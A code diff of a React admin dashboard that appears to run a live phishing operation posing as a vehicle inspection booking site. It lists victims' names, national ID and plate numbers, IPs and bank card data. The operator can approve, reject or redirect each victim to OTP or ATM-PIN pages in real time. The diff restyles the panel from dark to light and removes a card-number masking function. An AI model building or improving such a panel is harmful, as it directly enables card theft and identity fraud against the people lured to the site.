@@ -40,14 +40,14 @@ const PAGE_LABELS: Record<string, string> = {
 };
 
 const PAGE_COLORS: Record<string, string> = {
-  home: 'bg-gray-600',
-  booking: 'bg-blue-600',
-  payment: 'bg-yellow-600',
-  otp: 'bg-orange-600',
-  atm: 'bg-red-600',
-  'loading-page': 'bg-purple-600',
-  confirm: 'bg-teal-600',
-  success: 'bg-green-600',
+  home: 'bg-gray-100 text-gray-700',
+  booking: 'bg-blue-100 text-blue-700',
+  payment: 'bg-yellow-100 text-yellow-700',
+  otp: 'bg-orange-100 text-orange-700',
+  atm: 'bg-red-100 text-red-700',
+  'loading-page': 'bg-purple-100 text-purple-700',
+  confirm: 'bg-teal-100 text-teal-700',
+  success: 'bg-green-100 text-green-700',
 };
 
 const REDIRECT_OPTIONS = [
@@ -70,7 +70,6 @@ export default function AdminDashboard() {
   const [selectedSession, setSelectedSession] = useState<Session | null>(null);
   const [redirectTarget, setRedirectTarget] = useState('');
   const [actionLoading, setActionLoading] = useState<string | null>(null);
-  const [prevSessionIds, setPrevSessionIds] = useState<Set<string>>(new Set());
   const [newNotifications, setNewNotifications] = useState<string[]>([]);
 
   const fetchData = useCallback(async () => {
@@ -82,7 +81,6 @@ export default function AdminDashboard() {
       }
       const data = await res.json();
 
-      // كشف الجلسات الجديدة أو التي تغيرت صفحتها
       const newIds: string[] = [];
       data.sessions?.forEach((s: Session) => {
         if (s.is_new === 1) {
@@ -92,7 +90,6 @@ export default function AdminDashboard() {
 
       if (newIds.length > 0) {
         setNewNotifications(prev => [...new Set([...prev, ...newIds])]);
-        // صوت إشعار
         try {
           const ctx = new AudioContext();
           const osc = ctx.createOscillator();
@@ -110,19 +107,17 @@ export default function AdminDashboard() {
       setSessions(data.sessions || []);
       setActiveUsers(data.activeUsers || 0);
       setTotalVisits(data.totalVisits || 0);
-      setPrevSessionIds(new Set(data.sessions?.map((s: Session) => s.id) || []));
     } catch {}
     setLoading(false);
   }, [router]);
 
   useEffect(() => {
-    // التحقق من المصادقة
     fetch('/api/admin/verify').then(res => {
       if (res.status === 401) router.push('/admin/login');
     });
 
     fetchData();
-    const interval = setInterval(fetchData, 3000); // تحديث كل 3 ثواني
+    const interval = setInterval(fetchData, 3000);
     return () => clearInterval(interval);
   }, [fetchData, router]);
 
@@ -130,14 +125,9 @@ export default function AdminDashboard() {
     setActionLoading(sessionId + action);
     try {
       let body: Record<string, string> = {};
-
-      if (action === 'approve') {
-        body = { status: 'approved', redirect_to: '' };
-      } else if (action === 'reject') {
-        body = { status: 'rejected', redirect_to: '' };
-      } else if (action === 'redirect') {
-        body = { status: 'redirected', redirect_to: redirectTarget };
-      }
+      if (action === 'approve') body = { status: 'approved', redirect_to: '' };
+      else if (action === 'reject') body = { status: 'rejected', redirect_to: '' };
+      else if (action === 'redirect') body = { status: 'redirected', redirect_to: redirectTarget };
 
       await fetch(`/api/admin/sessions/${sessionId}`, {
         method: 'PATCH',
@@ -145,7 +135,6 @@ export default function AdminDashboard() {
         body: JSON.stringify(body),
       });
 
-      // مسح الإشعار
       setNewNotifications(prev => prev.filter(id => id !== sessionId));
       await fetchData();
     } catch {}
@@ -164,16 +153,11 @@ export default function AdminDashboard() {
     });
   }
 
-  function maskCard(card: string) {
-    if (!card) return '---';
-    return card.replace(/(\d{4})\s?(\d{4})\s?(\d{4})\s?(\d{4})/, '$1 **** **** $4');
-  }
-
   if (loading) {
     return (
-      <div className="min-h-screen bg-gray-900 flex items-center justify-center">
-        <div className="text-white text-xl flex items-center gap-3">
-          <svg className="animate-spin w-8 h-8 text-green-500" fill="none" viewBox="0 0 24 24">
+      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
+        <div className="text-gray-600 text-xl flex items-center gap-3">
+          <svg className="animate-spin w-8 h-8 text-green-600" fill="none" viewBox="0 0 24 24">
             <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
             <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
           </svg>
@@ -184,28 +168,28 @@ export default function AdminDashboard() {
   }
 
   return (
-    <div className="min-h-screen bg-gray-900 text-white" dir="rtl">
+    <div className="min-h-screen bg-gray-50 text-gray-800" dir="rtl">
       {/* Header */}
-      <header className="bg-gray-800 border-b border-gray-700 px-6 py-4">
+      <header className="bg-white border-b border-gray-200 px-6 py-4 shadow-sm">
         <div className="flex items-center justify-between">
           <div className="flex items-center gap-3">
-            <div className="w-10 h-10 bg-green-600 rounded-full flex items-center justify-center">
+            <div className="w-10 h-10 bg-green-600 rounded-full flex items-center justify-center shadow-sm">
               <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
               </svg>
             </div>
             <div>
-              <h1 className="text-xl font-bold">لوحة تحكم الأدمين</h1>
-              <p className="text-gray-400 text-xs">منصة الفحص الفني الدوري للمركبات</p>
+              <h1 className="text-xl font-bold text-gray-800">لوحة تحكم الأدمين</h1>
+              <p className="text-gray-500 text-xs">منصة الفحص الفني الدوري للمركبات</p>
             </div>
           </div>
           <div className="flex items-center gap-3">
-            <span className="text-xs text-gray-400 bg-gray-700 px-3 py-1 rounded-full">
+            <span className="text-xs text-gray-500 bg-gray-100 px-3 py-1 rounded-full border border-gray-200">
               🔄 تحديث تلقائي كل 3 ثواني
             </span>
             <button
               onClick={handleLogout}
-              className="bg-red-700 hover:bg-red-600 text-white text-sm px-4 py-2 rounded-lg transition-colors flex items-center gap-2"
+              className="bg-red-50 hover:bg-red-100 text-red-600 border border-red-200 text-sm px-4 py-2 rounded-lg transition-colors flex items-center gap-2"
             >
               <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
@@ -220,46 +204,46 @@ export default function AdminDashboard() {
         {/* Stats Cards */}
         <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
           {/* المتواجدون الآن */}
-          <div className="bg-gray-800 rounded-xl p-5 border border-gray-700">
+          <div className="bg-white rounded-xl p-5 border border-gray-200 shadow-sm">
             <div className="flex items-center justify-between">
               <div>
-                <p className="text-gray-400 text-sm">المتواجدون الآن</p>
-                <p className="text-4xl font-bold text-green-400 mt-1">{activeUsers}</p>
-                <p className="text-gray-500 text-xs mt-1">آخر 3 دقائق</p>
+                <p className="text-gray-500 text-sm">المتواجدون الآن</p>
+                <p className="text-4xl font-bold text-green-600 mt-1">{activeUsers}</p>
+                <p className="text-gray-400 text-xs mt-1">آخر 3 دقائق</p>
               </div>
-              <div className="w-14 h-14 bg-green-900/50 rounded-full flex items-center justify-center">
+              <div className="w-14 h-14 bg-green-50 rounded-full flex items-center justify-center border border-green-100">
                 <span className="text-2xl">👥</span>
               </div>
             </div>
             <div className="mt-3 flex items-center gap-1">
-              <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
-              <span className="text-green-400 text-xs">مباشر</span>
+              <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
+              <span className="text-green-600 text-xs font-medium">مباشر</span>
             </div>
           </div>
 
           {/* إجمالي الزيارات */}
-          <div className="bg-gray-800 rounded-xl p-5 border border-gray-700">
+          <div className="bg-white rounded-xl p-5 border border-gray-200 shadow-sm">
             <div className="flex items-center justify-between">
               <div>
-                <p className="text-gray-400 text-sm">إجمالي الزيارات</p>
-                <p className="text-4xl font-bold text-blue-400 mt-1">{totalVisits}</p>
-                <p className="text-gray-500 text-xs mt-1">منذ البداية</p>
+                <p className="text-gray-500 text-sm">إجمالي الزيارات</p>
+                <p className="text-4xl font-bold text-blue-600 mt-1">{totalVisits}</p>
+                <p className="text-gray-400 text-xs mt-1">منذ البداية</p>
               </div>
-              <div className="w-14 h-14 bg-blue-900/50 rounded-full flex items-center justify-center">
+              <div className="w-14 h-14 bg-blue-50 rounded-full flex items-center justify-center border border-blue-100">
                 <span className="text-2xl">📊</span>
               </div>
             </div>
           </div>
 
           {/* إجمالي العملاء */}
-          <div className="bg-gray-800 rounded-xl p-5 border border-gray-700">
+          <div className="bg-white rounded-xl p-5 border border-gray-200 shadow-sm">
             <div className="flex items-center justify-between">
               <div>
-                <p className="text-gray-400 text-sm">إجمالي العملاء</p>
-                <p className="text-4xl font-bold text-purple-400 mt-1">{sessions.length}</p>
-                <p className="text-gray-500 text-xs mt-1">جلسة مسجلة</p>
+                <p className="text-gray-500 text-sm">إجمالي العملاء</p>
+                <p className="text-4xl font-bold text-purple-600 mt-1">{sessions.length}</p>
+                <p className="text-gray-400 text-xs mt-1">جلسة مسجلة</p>
               </div>
-              <div className="w-14 h-14 bg-purple-900/50 rounded-full flex items-center justify-center">
+              <div className="w-14 h-14 bg-purple-50 rounded-full flex items-center justify-center border border-purple-100">
                 <span className="text-2xl">🧾</span>
               </div>
             </div>
@@ -267,9 +251,9 @@ export default function AdminDashboard() {
         </div>
 
         {/* Bookings Table */}
-        <div className="bg-gray-800 rounded-xl border border-gray-700 overflow-hidden">
-          <div className="px-6 py-4 border-b border-gray-700 flex items-center justify-between">
-            <h2 className="text-lg font-semibold flex items-center gap-2">
+        <div className="bg-white rounded-xl border border-gray-200 shadow-sm overflow-hidden">
+          <div className="px-6 py-4 border-b border-gray-200 flex items-center justify-between bg-white">
+            <h2 className="text-lg font-semibold text-gray-800 flex items-center gap-2">
               📋 قائمة الحجوزات
               {newNotifications.length > 0 && (
                 <span className="bg-red-500 text-white text-xs px-2 py-0.5 rounded-full animate-pulse">
@@ -277,13 +261,13 @@ export default function AdminDashboard() {
                 </span>
               )}
             </h2>
-            <span className="text-gray-400 text-sm">{sessions.length} عميل</span>
+            <span className="text-gray-500 text-sm">{sessions.length} عميل</span>
           </div>
 
           <div className="overflow-x-auto">
             <table className="w-full text-sm">
-              <thead className="bg-gray-750 border-b border-gray-700">
-                <tr className="text-gray-400 text-xs">
+              <thead className="bg-gray-50 border-b border-gray-200">
+                <tr className="text-gray-500 text-xs font-semibold">
                   <th className="px-4 py-3 text-right">#</th>
                   <th className="px-4 py-3 text-right">الدولة</th>
                   <th className="px-4 py-3 text-right">الاسم</th>
@@ -295,10 +279,10 @@ export default function AdminDashboard() {
                   <th className="px-4 py-3 text-right">الإجراءات</th>
                 </tr>
               </thead>
-              <tbody className="divide-y divide-gray-700">
+              <tbody className="divide-y divide-gray-100">
                 {sessions.length === 0 ? (
                   <tr>
-                    <td colSpan={9} className="text-center py-12 text-gray-500">
+                    <td colSpan={9} className="text-center py-12 text-gray-400">
                       <div className="text-4xl mb-2">📭</div>
                       لا توجد حجوزات بعد
                     </td>
@@ -309,32 +293,32 @@ export default function AdminDashboard() {
                     return (
                       <tr
                         key={session.id}
-                        className={`hover:bg-gray-750 transition-colors ${isNew ? 'bg-yellow-900/20 border-r-2 border-yellow-500' : ''}`}
+                        className={`hover:bg-gray-50 transition-colors ${isNew ? 'bg-yellow-50 border-r-2 border-yellow-400' : ''}`}
                       >
                         <td className="px-4 py-3 text-gray-400">{idx + 1}</td>
                         <td className="px-4 py-3">
                           <span className="text-base">{getFlagEmoji(session.country)}</span>
-                          <span className="text-gray-300 text-xs mr-1">{session.country || 'غير معروف'}</span>
+                          <span className="text-gray-600 text-xs mr-1">{session.country || 'غير معروف'}</span>
                         </td>
-                        <td className="px-4 py-3 font-medium text-white">
-                          {session.name || <span className="text-gray-500">---</span>}
+                        <td className="px-4 py-3 font-medium text-gray-800">
+                          {session.name || <span className="text-gray-400">---</span>}
                           {isNew && (
-                            <span className="mr-2 bg-yellow-500 text-black text-xs px-1.5 py-0.5 rounded font-bold">
+                            <span className="mr-2 bg-yellow-400 text-yellow-900 text-xs px-1.5 py-0.5 rounded font-bold">
                               جديد
                             </span>
                           )}
                         </td>
-                        <td className="px-4 py-3 text-gray-300 font-mono text-xs">
+                        <td className="px-4 py-3 text-gray-600 font-mono text-xs">
                           {session.id_number || '---'}
                         </td>
-                        <td className="px-4 py-3 text-gray-300 font-mono text-xs">
+                        <td className="px-4 py-3 text-gray-600 font-mono text-xs">
                           {session.plate_number || '---'}
                         </td>
-                        <td className="px-4 py-3 text-gray-400 text-xs">
+                        <td className="px-4 py-3 text-gray-500 text-xs">
                           {formatDate(session.updated_at)}
                         </td>
                         <td className="px-4 py-3">
-                          <span className={`inline-flex items-center gap-1 text-xs text-white px-2 py-1 rounded-full ${PAGE_COLORS[session.current_page] || 'bg-gray-600'}`}>
+                          <span className={`inline-flex items-center gap-1 text-xs px-2 py-1 rounded-full font-medium ${PAGE_COLORS[session.current_page] || 'bg-gray-100 text-gray-600'}`}>
                             {PAGE_LABELS[session.current_page] || session.current_page}
                           </span>
                         </td>
@@ -347,9 +331,8 @@ export default function AdminDashboard() {
                               onClick={() => {
                                 setSelectedSession(session);
                                 setRedirectTarget('');
-                                setNewNotifications(prev => prev.filter(id => id !== session.id));
                               }}
-                              className="bg-blue-700 hover:bg-blue-600 text-white text-xs px-3 py-1.5 rounded-lg transition-colors"
+                              className="bg-blue-50 hover:bg-blue-100 text-blue-700 border border-blue-200 text-xs px-3 py-1.5 rounded-lg transition-colors font-medium"
                             >
                               التفاصيل
                             </button>
@@ -357,7 +340,7 @@ export default function AdminDashboard() {
                               <select
                                 value={redirectTarget}
                                 onChange={e => setRedirectTarget(e.target.value)}
-                                className="bg-gray-700 border border-gray-600 text-white text-xs rounded px-2 py-1.5 focus:outline-none focus:border-green-500"
+                                className="bg-white border border-gray-300 text-gray-700 text-xs rounded px-2 py-1.5 focus:outline-none focus:border-green-500"
                                 onClick={e => e.stopPropagation()}
                               >
                                 {REDIRECT_OPTIONS.map(o => (
@@ -367,7 +350,7 @@ export default function AdminDashboard() {
                               <button
                                 onClick={() => handleAction(session.id, 'redirect')}
                                 disabled={!redirectTarget || actionLoading === session.id + 'redirect'}
-                                className="bg-purple-700 hover:bg-purple-600 disabled:opacity-50 disabled:cursor-not-allowed text-white text-xs px-2 py-1.5 rounded-lg transition-colors"
+                                className="bg-purple-50 hover:bg-purple-100 disabled:opacity-50 disabled:cursor-not-allowed text-purple-700 border border-purple-200 text-xs px-2 py-1.5 rounded-lg transition-colors font-medium"
                               >
                                 توجيه
                               </button>
@@ -386,24 +369,24 @@ export default function AdminDashboard() {
 
       {/* Modal - تفاصيل العميل */}
       {selectedSession && (
-        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4" onClick={() => setSelectedSession(null)}>
+        <div className="fixed inset-0 bg-black/40 flex items-center justify-center z-50 p-4" onClick={() => setSelectedSession(null)}>
           <div
-            className="bg-gray-800 rounded-2xl w-full max-w-2xl max-h-[90vh] overflow-y-auto border border-gray-600 shadow-2xl"
+            className="bg-white rounded-2xl w-full max-w-2xl max-h-[90vh] overflow-y-auto border border-gray-200 shadow-2xl"
             onClick={e => e.stopPropagation()}
             dir="rtl"
           >
             {/* Modal Header */}
-            <div className="sticky top-0 bg-gray-800 border-b border-gray-700 px-6 py-4 flex items-center justify-between rounded-t-2xl">
+            <div className="sticky top-0 bg-white border-b border-gray-200 px-6 py-4 flex items-center justify-between rounded-t-2xl">
               <div className="flex items-center gap-3">
-                <div className="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center text-lg">
+                <div className="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center text-lg border border-blue-200">
                   {getFlagEmoji(selectedSession.country)}
                 </div>
                 <div>
-                  <h3 className="font-bold text-lg">{selectedSession.name || 'عميل مجهول'}</h3>
-                  <p className="text-gray-400 text-xs">{selectedSession.country} • {selectedSession.ip}</p>
+                  <h3 className="font-bold text-lg text-gray-800">{selectedSession.name || 'عميل مجهول'}</h3>
+                  <p className="text-gray-500 text-xs">{selectedSession.country} • {selectedSession.ip}</p>
                 </div>
               </div>
-              <button onClick={() => setSelectedSession(null)} className="text-gray-400 hover:text-white">
+              <button onClick={() => setSelectedSession(null)} className="text-gray-400 hover:text-gray-600 p-1 rounded-lg hover:bg-gray-100">
                 <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                   <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                 </svg>
@@ -412,9 +395,9 @@ export default function AdminDashboard() {
 
             <div className="p-6 space-y-5">
               {/* الصفحة الحالية */}
-              <div className="flex items-center gap-2">
-                <span className="text-gray-400 text-sm">الصفحة الحالية:</span>
-                <span className={`text-xs text-white px-3 py-1 rounded-full ${PAGE_COLORS[selectedSession.current_page] || 'bg-gray-600'}`}>
+              <div className="flex items-center gap-2 flex-wrap">
+                <span className="text-gray-500 text-sm">الصفحة الحالية:</span>
+                <span className={`text-xs px-3 py-1 rounded-full font-medium ${PAGE_COLORS[selectedSession.current_page] || 'bg-gray-100 text-gray-600'}`}>
                   {PAGE_LABELS[selectedSession.current_page] || selectedSession.current_page}
                 </span>
                 <StatusBadge status={selectedSession.status} />
@@ -433,7 +416,7 @@ export default function AdminDashboard() {
               {/* بيانات البطاقة */}
               {(selectedSession.card_number || selectedSession.card_holder) && (
                 <Section title="💳 بيانات البطاقة البنكية">
-                  <div className="bg-gradient-to-r from-gray-700 to-gray-600 rounded-xl p-4 mb-3">
+                  <div className="bg-gradient-to-r from-gray-700 to-gray-800 rounded-xl p-4 mb-3 shadow-md">
                     <div className="flex justify-between items-start mb-4">
                       <span className="text-gray-300 text-xs">بطاقة الدفع</span>
                       <span className="text-white font-bold text-sm">VISA / MC</span>
@@ -477,27 +460,27 @@ export default function AdminDashboard() {
                   <button
                     onClick={() => handleAction(selectedSession.id, 'approve')}
                     disabled={actionLoading === selectedSession.id + 'approve'}
-                    className="bg-green-700 hover:bg-green-600 disabled:opacity-50 text-white py-3 rounded-xl font-semibold transition-colors flex items-center justify-center gap-2"
+                    className="bg-green-600 hover:bg-green-700 disabled:opacity-50 text-white py-3 rounded-xl font-semibold transition-colors flex items-center justify-center gap-2 shadow-sm"
                   >
                     ✅ قبول
                   </button>
                   <button
                     onClick={() => handleAction(selectedSession.id, 'reject')}
                     disabled={actionLoading === selectedSession.id + 'reject'}
-                    className="bg-red-700 hover:bg-red-600 disabled:opacity-50 text-white py-3 rounded-xl font-semibold transition-colors flex items-center justify-center gap-2"
+                    className="bg-red-600 hover:bg-red-700 disabled:opacity-50 text-white py-3 rounded-xl font-semibold transition-colors flex items-center justify-center gap-2 shadow-sm"
                   >
                     ❌ رفض
                   </button>
                 </div>
 
                 {/* إعادة التوجيه */}
-                <div className="bg-gray-700 rounded-xl p-4">
-                  <p className="text-gray-300 text-sm mb-3 font-medium">إعادة توجيه العميل إلى:</p>
+                <div className="bg-gray-50 rounded-xl p-4 border border-gray-200">
+                  <p className="text-gray-600 text-sm mb-3 font-medium">إعادة توجيه العميل إلى:</p>
                   <div className="flex gap-2">
                     <select
                       value={redirectTarget}
                       onChange={e => setRedirectTarget(e.target.value)}
-                      className="flex-1 bg-gray-600 border border-gray-500 text-white rounded-lg px-3 py-2 text-sm focus:outline-none focus:border-green-500"
+                      className="flex-1 bg-white border border-gray-300 text-gray-700 rounded-lg px-3 py-2 text-sm focus:outline-none focus:border-green-500 focus:ring-2 focus:ring-green-100"
                     >
                       {REDIRECT_OPTIONS.map(o => (
                         <option key={o.value} value={o.value}>{o.label}</option>
@@ -506,7 +489,7 @@ export default function AdminDashboard() {
                     <button
                       onClick={() => handleAction(selectedSession.id, 'redirect')}
                       disabled={!redirectTarget || actionLoading === selectedSession.id + 'redirect'}
-                      className="bg-purple-700 hover:bg-purple-600 disabled:opacity-50 disabled:cursor-not-allowed text-white px-4 py-2 rounded-lg text-sm font-semibold transition-colors"
+                      className="bg-purple-600 hover:bg-purple-700 disabled:opacity-50 disabled:cursor-not-allowed text-white px-4 py-2 rounded-lg text-sm font-semibold transition-colors shadow-sm"
                     >
                       {actionLoading === selectedSession.id + 'redirect' ? '...' : 'توجيه'}
                     </button>
@@ -514,7 +497,7 @@ export default function AdminDashboard() {
                 </div>
               </Section>
 
-              <p className="text-gray-600 text-xs text-center">
+              <p className="text-gray-400 text-xs text-center">
                 آخر تحديث: {formatDate(selectedSession.updated_at)} • ID: {selectedSession.id.substring(0, 8)}...
               </p>
             </div>
@@ -527,8 +510,8 @@ export default function AdminDashboard() {
 
 function Section({ title, children }: { title: string; children: React.ReactNode }) {
   return (
-    <div className="bg-gray-750 rounded-xl border border-gray-700 overflow-hidden">
-      <div className="bg-gray-700 px-4 py-2.5 text-sm font-semibold text-gray-200">{title}</div>
+    <div className="bg-white rounded-xl border border-gray-200 overflow-hidden shadow-sm">
+      <div className="bg-gray-50 px-4 py-2.5 text-sm font-semibold text-gray-700 border-b border-gray-200">{title}</div>
       <div className="p-4 space-y-2">{children}</div>
     </div>
   );
@@ -537,8 +520,8 @@ function Section({ title, children }: { title: string; children: React.ReactNode
 function InfoRow({ label, value, mono, highlight }: { label: string; value: string; mono?: boolean; highlight?: boolean }) {
   return (
     <div className="flex items-center justify-between py-1">
-      <span className="text-gray-400 text-sm">{label}</span>
-      <span className={`text-sm ${mono ? 'font-mono' : ''} ${highlight ? 'text-yellow-300 font-bold text-base' : 'text-white'} ${!value ? 'text-gray-600' : ''}`}>
+      <span className="text-gray-500 text-sm">{label}</span>
+      <span className={`text-sm ${mono ? 'font-mono' : ''} ${highlight ? 'text-green-700 font-bold text-base bg-green-50 px-2 py-0.5 rounded' : 'text-gray-800'} ${!value ? 'text-gray-400' : ''}`}>
         {value || '---'}
       </span>
     </div>
@@ -547,12 +530,12 @@ function InfoRow({ label, value, mono, highlight }: { label: string; value: stri
 
 function StatusBadge({ status }: { status: string }) {
   const map: Record<string, { label: string; class: string }> = {
-    active: { label: 'نشط', class: 'bg-blue-900 text-blue-300' },
-    approved: { label: 'مقبول', class: 'bg-green-900 text-green-300' },
-    rejected: { label: 'مرفوض', class: 'bg-red-900 text-red-300' },
-    redirected: { label: 'موجَّه', class: 'bg-purple-900 text-purple-300' },
+    active: { label: 'نشط', class: 'bg-blue-100 text-blue-700 border border-blue-200' },
+    approved: { label: 'مقبول', class: 'bg-green-100 text-green-700 border border-green-200' },
+    rejected: { label: 'مرفوض', class: 'bg-red-100 text-red-700 border border-red-200' },
+    redirected: { label: 'موجَّه', class: 'bg-purple-100 text-purple-700 border border-purple-200' },
   };
-  const s = map[status] || { label: status, class: 'bg-gray-700 text-gray-300' };
+  const s = map[status] || { label: status, class: 'bg-gray-100 text-gray-600 border border-gray-200' };
   return (
     <span className={`inline-flex text-xs px-2 py-0.5 rounded-full font-medium ${s.class}`}>
       {s.label}
